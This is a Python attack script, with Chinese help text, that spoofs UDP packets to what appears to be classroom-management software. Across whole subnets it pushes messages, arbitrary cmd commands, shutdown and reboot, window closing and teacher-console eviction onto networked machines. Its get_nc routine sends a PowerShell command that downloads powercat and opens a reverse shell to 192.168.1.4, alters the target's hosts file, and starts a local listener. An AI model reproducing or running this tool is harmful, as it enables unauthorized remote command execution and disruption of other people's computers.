#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import getopt
import socket
import Data
import time
import random
import Tcp_Injection as ti
import threading
import os
def printUsage():
    print ('''
        usage: test.py -i <ip> -p <port> -m <message> -c <command> -r -s -k -t -l -h \n
       test.py --ip <ip> --port <port> --message <message> --command <command> --reboot --shutdown --kill --time --loop --help --caw --ctw --sih --echo --sip --sport\n
       --------------------------------------------------------------\n
       -i[ip]:                      目标IP地址,形如 224.50.50.42 或
                                    172.25.10.1-255 或 172.25.10.1/24
                                     这样的单个/多个ip或整个网段。  
                                     注：224.50.50.42是组播地址，可用
                                     于全频道攻击。
       -p[port]:                     接收方端口,默认4705。
       -m[message]:                  要发送的消息。
       -c[command]:                  要执行的cmd命令。
       -r[reboot]:                   重启目标机器。
       -s[shutdown]:                 关闭目标机器。
       -k[kill]:                     挤下教师端。    
                                     注:教师端会提示,断腿操作!慎!!!!
       -t[time]:                     设置循环执行的时间间隔,默认为5秒
       -l[loop]:                     设置循环次数,默认为1次
       --caw[close_all_windows]:     关闭目标所有程序
       --ctw[close_top_windows]:     关闭目标顶端窗口
       --sih[sign_in_harassment]:    签到骚扰
       -h[help]:                     帮助菜单。
       --sip[source_ip]:             发包的ip,没啥用,Windows XP 后已经
                                     禁止更改发包ip了
       --sport:                      发包端口,默认随机 
       --echo:                       开启回显,默认关闭
       **************************************************************\n
       例:
       Injecion.py -i 224.50.50.42-224 -m "Test"
       Injecion.py -i 224.50.50.42/24 -m "Test" -t 3 -l 5
       Injecion.py -i 224.50.50.42 -c "for /l %i in (1,1,10) do (@pause)"
       Injecion.py -i 224.50.50.42 -k
       Injecion.py -i 224.50.50.42 --sih -t 1 -l 20 --echo -m "Ha Ha Ha"
       --------------------------------------------------------------\n
       ''')
 
def main():
    if len(sys.argv)< 2 :
        printUsage()
        sys.exit(-1)
    config ={
    "ip" : "",
    "port" : "4705",
    "message" : "",
    "command" : "",
    "time":5,
    "loop":1,
    "reboot":0,
    "shutdown":0,
    "kill":0,
    "caw":0,
    "ctw":0,
    "sih":0,
    "echo":0,
    "sip":"224.50.50.42",
    "sport":random.randint(1, 65535)

    }
    try:
        opts, args = getopt.getopt(sys.argv[1:],"i:p:m:c:t:l:rskh",["ip=","port=","message=","command=","time=","loop=","reboot","shutdown","kill","help","caw","ctw","sih","echo","sip=","sport=","nc"])
    except getopt.GetoptError:
        print("参数错误!"+"sys.argv:"+str(sys.argv))
        printUsage()
        sys.exit(-1)
    for opt,arg in opts:
        if opt in ("-i", "--ip"):
            config["ip"] =arg
        elif opt in ("-p","--port"):
            config["port"] =int(arg)
        elif opt in ("-m","--message"):
            config["message"] =arg
        elif opt in ("-c","--command"):
            config["command"] =arg
        elif opt in ("-t","--time"):
            config["time"] =int(arg)
        elif opt in ("-l","--loop"):
            config["loop"] =int(arg)
        elif opt in ("-r","--reboot"):
            config["reboot"] =1
        elif opt in ("-s","--shutdown"):
            config["shutdown"] =1
        elif opt in ("-k","--kill"):
           config["kill"] =1
        elif opt in "--caw":
           config["caw"] =1
        elif opt in "--ctw":
           config["ctw"] =1
        elif opt in "--sih":
           config["sih"] =1
        elif opt in "--echo":
           config["echo"] =1
        elif opt in "--sip":
           config["sip"] =arg
        elif opt in "--nc":
           th = threading.Thread(target=get_nc)
           th.start()
        elif opt in "--sport":
           config["sport"] =int(arg)
        elif opt in("-h","--help"):
            printUsage()

    if config["echo"] ==1 : 
        print("----------------------------------------------------------------")
        for i in config:
            print("|    %-16s    :    %-24s         |"%(i,str(config[i])))
            #print('|'+i+': ' + str(config[i]))
        print("----------------------------------------------------------------")
        print("|%-62s|"%("Other:"+",".join(args)))
        print("|%-58s|"%("攻击ip列表:" + str(get_iplist(config["ip"]))))
        print("----------------------------------------------------------------")
    send(config)
def get_nc():
    payload=r"powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd"
    pa = r"echo 151.101.76.133 raw.githubusercontent.com >> C:/Windows/System32/drivers/etc/hosts"
    pad = Data.Data(data=r"/c "+pa,effect="cmd",nocmd=0,notag=0).pack()
    try:
        ti.UDP(config["sip"],ip,config["sport"],config["port"],pad).send
    except Exception as e:
        print(e)

    nc = Data.Data(data=r"/c "+payload,effect="cmd",nocmd=0,notag=0).pack()
    try:
        print("[-------------]")
        ti.UDP(config["sip"],ip,config["sport"],config["port"],nc).send
    except Exception as e:
        print("nc连接失败，原因：",end="")
        print(e)
    else:
        print("尝试后台监听")
        os.system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l -p 9999")

    #根据给出的ip/ip段构建ip列表
def get_iplist(ip):
    ip_list = []

    if ip.partition(r'/')[1] =='/':
        ip = ip.partition(r'/')
       # print("以%s位子网掩码构造ip列表"%(ip[2]))
    elif ip.partition(r'-')[1] =='-':
        ip = ip.partition(r'-') 
       # print("以范围%s - %s 构造ip列表"%(ip[0].rpartition(r'.')[2],ip[2]))
    
    #print("正以%12s为原型在构造ip列表"%(str(ip)))

    if len(ip) > 0:
        if  ip[1] == '/':
            if  int(ip[2])< 33  and int(ip[2]) > 0:
                bgn = int(ip[0].rpartition(r'.')[2])
                end = pow(2,(32-int(ip[2])))+1
                for j in range(bgn,bgn+end):
                    if j < 256:
                        ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(j))
        elif  ip[1]== '-':
            for i in range(int(ip[0].rpartition(r'.')[2]),int(ip[2])+1):
                if i < 256:
                    ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(i))
        else :
            try:
                socket.inet_aton(ip)
            except socket.error:
                print('不符合规则的ip,请重试')
                return
            else:
                ip_list.append(ip)
    return ip_list

def send(config):
    for count in range(int(config["loop"])):
        for ip in get_iplist(config["ip"]):
            if config["echo"] ==1:
                    print("----------------------------------------------------------------")
                    print("|正在对ip为 %-16s 的设备进行发包!                   |"%(ip))
                    print("----------------------------------------------------------------")
            #消息数据包
            payload_message = Data.Data(data=config["message"],effect="msg",nocmd=1,notag=0).pack()
            #命令数据包
            payload_command = Data.Data(data=r"/c "+config["command"],effect="cmd",nocmd=0,notag=0).pack()
            #关闭所有程序数据包
            payload_caw = Data.Data(data="",effect="caw",nocmd=0,notag=0).pack()
            #关闭置顶程序数据包
            payload_ctw = Data.Data(data="",effect="ctw",nocmd=0,notag=0).pack()
            #挤下教师端数据包
            payload_kill = Data.Data(data="",effect="kill",nocmd=0,notag=1).pack()
            #发送签到数据包
            payload_sih = Data.Data(data="",effect="sih",nocmd=0,notag=0).pack()
            #关机数据包
            payload_shutdown = Data.Data(data=r"/c shutdown /p",effect="cmd",nocmd=0,notag=0).pack()
            #重启数据包
            payload_reboot = Data.Data(data=r"/c shutdown /r /t 0",effect="cmd",nocmd=0,notag=0).pack()

            run = {
            "caw":payload_caw,
            "ctw":payload_ctw,
            "kill":payload_kill,
            "sih":payload_sih,
            "shutdown":payload_shutdown,
            "reboot":payload_reboot
            }

            if config["echo"] ==1:
                print("----------------------------------------------------------------")
            for choice in run:
                if config[choice]!=0:
                    try:
                        ti.UDP(config["sip"],ip,config["sport"],config[
                        "port"],run[choice]).send()
                    except Exception as e:
                        print(e)
                    else:
                        if config["echo"]==1:
                            print("|Running %-16s  :%-16s  is Send Success! |"%(str(choice),str(config[choice])))



            if config["message"]!='':
                try:
                    ti.UDP(config["sip"],ip,config["sport"],config[
                        "port"],payload_message).send()
                except Exception as e:
                    print(e)
                else:
                    if config["echo"]==1:
                        print("|Running %-16s  :%-16s  is Send Success! |"%("Message",config["message"]))

            if config["command"]!='':
                try:
                    ti.UDP(config["sip"],ip,config["sport"],config[
                        "port"],payload_command).send()
                except Exception as e:
                    print(e)
                else:
                    if config["echo"]==1:
                        print("|Running %-16s  :%-16s  is Send Success! |"%("command",config["command"]))
                if config["echo"] ==1:
                    print("----------------------------------------------------------------")
        
        if config["echo"]==1:
            print("----------------------------------------------------------------")
            print("|已执行完 %-16s次! 休眠%-16s秒后继续执行!|"%(str(count+1),str(config["time"])))
            print("----------------------------------------------------------------")
        time.sleep(config["time"])
    print("----------------------------------------------------------------")
    print("|%-56s|"%("任务执行完成!"))
    print("----------------------------------------------------------------")

if __name__=="__main__":
    main()
